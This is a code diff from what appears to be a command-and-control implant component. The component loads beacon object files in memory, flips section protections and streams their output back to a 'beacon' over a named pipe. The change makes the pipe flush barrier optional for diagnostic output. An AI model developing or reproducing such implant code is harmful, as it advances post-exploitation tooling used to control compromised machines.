@@ -135,10 +135,12 @@ static void shim_printf(int type, const char * fmt, ...) {
 
 /* deliver buffered output through a fresh pipe server in kit chunks */
 /* once-mode flush: kit chunks straight down the CONTROL pipe (already
- * connected by the beacon's job register). FlushFileBuffers is the
- * consumption barrier: it blocks until the client (beacon) has read
- * everything, so nothing is lost when the process exits right after. */
-static BOOL flush_output_ctrl(HANDLE ctrl) {
+ * connected by the beacon's job register). barrier=TRUE (once output)
+ * blocks in FlushFileBuffers until the client consumed everything - the
+ * consumption guarantee. barrier=FALSE for diagnostics: fire-and-forget,
+ * because the barrier stalls the DLL against the beacon's task batch and
+ * pushed later flush windows past their registers (C-23 live jams). */
+static BOOL flush_output_ctrl_ex(HANDLE ctrl, BOOL barrier) {
 	DWORD mode = PIPE_READMODE_BYTE;
 	POSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;
 	int chunkMax = pa->maxPacketSize > 256 ? pa->maxPacketSize - 64 : 1024 * 1024 - 64;
@@ -167,7 +169,8 @@ static BOOL flush_output_ctrl(HANDLE ctrl) {
 		off += payload;
 		cid++;
 	} while (off < g_outLen);
-	FlushFileBuffers(ctrl);
+	if (barrier)
+		FlushFileBuffers(ctrl);
 	return TRUE;
 }
 
@@ -494,7 +497,7 @@ static int run_bof(char * wire, int wireLen) {
 		 * pushed the output-pipe register past the DLL's 15s client-wait
 		 * window (live 11:59 jam). BG diag rides the normal output flush. */
 		if (g_runOnce && g_outLen > 0 && g_ctrl != INVALID_HANDLE_VALUE) {
-			flush_output_ctrl(g_ctrl);
+			flush_output_ctrl_ex(g_ctrl, FALSE);
 			g_outLen = 0;
 		}
 		VirtualProtect(secs[SEC_TEXT], seclen[SEC_TEXT] > 0 ? seclen[SEC_TEXT] : 1, PAGE_EXECUTE_READ, &old);
@@ -526,7 +529,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 					"[asyncdiag] bg-wait t+%ds avail=%d", tries, (int)avail);
 				if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
 				if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
-					flush_output_ctrl(g_ctrl);
+					flush_output_ctrl_ex(g_ctrl, FALSE);
 					g_outLen = 0;
 				}
 			}
@@ -554,7 +557,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 					(int)avail, pl, bl);
 				if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
 				if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
-					flush_output_ctrl(g_ctrl);
+					flush_output_ctrl_ex(g_ctrl, FALSE);
 					g_outLen = 0;
 				}
 			}
@@ -567,7 +570,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 				"[asyncdiag] followup recv pipe=%d wire=%d", pl, bl);
 			if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
 			if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
-				flush_output_ctrl(g_ctrl);
+				flush_output_ctrl_ex(g_ctrl, FALSE);
 				g_outLen = 0;
 			}
 		}
@@ -630,7 +633,7 @@ static void run_async(LPVOID raw) {
 			 * them, no second connection race. FlushFileBuffers blocks
 			 * until the beacon has consumed the bytes - closing early would
 			 * discard the pipe buffer (C-21 factor 3). */
-			flush_output_ctrl(g_ctrl);
+			flush_output_ctrl_ex(g_ctrl, TRUE);
 		} else {
 			flush_output_pipe(pn);
 		}
